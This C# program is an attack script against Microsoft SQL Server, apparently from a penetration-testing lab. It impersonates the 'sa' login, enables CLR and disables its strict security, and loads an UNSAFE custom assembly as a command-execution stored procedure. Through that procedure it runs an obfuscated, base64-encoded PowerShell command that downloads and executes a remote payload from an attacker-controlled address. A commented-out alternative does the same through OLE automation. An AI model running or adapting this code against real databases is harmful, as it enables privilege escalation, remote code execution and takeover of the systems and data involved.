using System;
using System.Data.SqlClient;

namespace sql
{
    class Program
    {
        // .\ConsoleApp1.exe 192.168.49.71
        static void Main(string[] args)
        {

            String sqlServer = "dc01.corp1.com";
            String database = "master";
            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);
            try
            {
                con.Open(); Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed"); Environment.Exit(0);
            }
            String impersonateUser = "use msdb; EXECUTE AS LOGIN = 'sa';";
            String drop = "drop assembly myAssembly;";
            String drop0 = "drop procedure cmdExec;";
            String enable_ext_assemblies = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'clr enabled', 1; RECONFIGURE; EXEC sp_configure 'clr strict security', 0; RECONFIGURE;";
            String create_assembly = "CREATE ASSEMBLY myAssembly FROM 'c:\\tools\\sp.dll' WITH PERMISSION_SET = UNSAFE;";
            String create_procedure = "CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec];";
            String exec = "EXEC [dbo].[cmdExec] 'powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADcAMQAvAHIAZQB2AC0AcwBsAGkAbQAuAHQAeAB0ACcAKQAKAA==';";
            //String execCmd = "DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADcAMQAvAHIAZQB2AC0AcwBsAGkAbQAuAHQAeAB0ACcAKQAKAA==';";

            SqlCommand command = new SqlCommand(impersonateUser, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();
            Console.WriteLine("user impersonated!");

            command = new SqlCommand(enable_ext_assemblies, con);
            reader = command.ExecuteReader();
            reader.Close();
            Console.WriteLine("external assemblies enabled!");
/* enable if script is ran a second time
            command = new SqlCommand(drop0, con);
            reader = command.ExecuteReader();
            reader.Close();
            Console.WriteLine("procedure cmdExec dropped!");


            command = new SqlCommand(drop, con);
            reader = command.ExecuteReader();
            reader.Close();
            Console.WriteLine("old assembly dropped!");
*/
            command = new SqlCommand(create_assembly, con);
            reader = command.ExecuteReader();
            reader.Close();
            Console.WriteLine("assembly created!");


            command = new SqlCommand(create_procedure, con);
            reader = command.ExecuteReader();
            reader.Close();
            Console.WriteLine("stored procedure created!");

            command = new SqlCommand(exec, con);
            reader = command.ExecuteReader();
            reader.Close();

            con.Close();
        }
    }
}
